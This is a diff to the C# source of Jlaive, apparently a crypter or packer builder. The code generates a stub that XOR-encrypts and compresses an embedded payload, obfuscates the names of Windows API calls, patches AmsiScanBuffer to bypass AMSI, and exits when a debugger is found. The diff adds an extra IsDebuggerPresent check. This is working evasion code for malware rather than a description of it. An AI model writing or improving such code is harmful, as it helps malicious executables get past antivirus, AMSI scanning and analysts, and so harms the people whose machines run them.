@@ -27,10 +27,12 @@ namespace Jlaive
             string uncompressfunction = RandomString(10, rng);
             string virtualprotect = RandomString(10, rng);
             string checkremotedebugger = RandomString(10, rng);
+            string isdebuggerpresent = RandomString(10, rng);
             string key = RandomString(20, rng);
             string encrypted = Convert.ToBase64String(XORCrypt(Compress(pbytes), key));
             string amsiscanbuffer_str = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), key));
             string checkremotedebugger_str = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key));
+            string isdebuggerpresent_str = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("IsDebuggerPresent"), key));
             return @"using System;
 using System.Diagnostics;
 using System.Text;
@@ -51,6 +53,7 @@ namespace " + namespacename + @"
 
         " + (bamsi ? $"delegate bool {virtualprotect}(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);" : string.Empty) + @"
         " + (antidebug ? $"delegate bool {checkremotedebugger}(IntPtr hProcess, ref bool isDebuggerPresent);" : string.Empty) + @"
+        " + (antidebug ? $"delegate bool {isdebuggerpresent}();" : string.Empty) + @"
 
         static string payload = """ + encrypted + @""";
 
@@ -60,10 +63,12 @@ namespace " + namespacename + @"
 
             " + (antidebug ?
 @"IntPtr crdpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + xorfunction + @"(Convert.FromBase64String(""" + checkremotedebugger_str + @"""), """ + key + @""")));
+IntPtr idpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + xorfunction + @"(Convert.FromBase64String(""" + isdebuggerpresent_str + @"""), """ + key + @""")));
 " + checkremotedebugger + @" CheckRemoteDebuggerPresent = (" + checkremotedebugger + @")Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(" + checkremotedebugger + @"));
-bool isDebuggerPresent = false;
-CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
-if (Debugger.IsAttached || isDebuggerPresent) Environment.Exit(1);" : string.Empty) + @"
+" + isdebuggerpresent + @" IsDebuggerPresent = (" + isdebuggerpresent + @")Marshal.GetDelegateForFunctionPointer(idpaddr, typeof(" + isdebuggerpresent + @"));
+bool remotedebug = false;
+CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remotedebug);
+if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) Environment.Exit(1);" : string.Empty) + @"
 
             " + (bamsi ?
             @"IntPtr vpaddr = GetProcAddress(kmodule, ""V"" + ""i"" + ""r"" + ""t"" + ""u"" + ""a"" + ""l"" + ""P"" + ""r"" + ""o"" + ""t"" + ""e"" + ""c"" + ""t"");
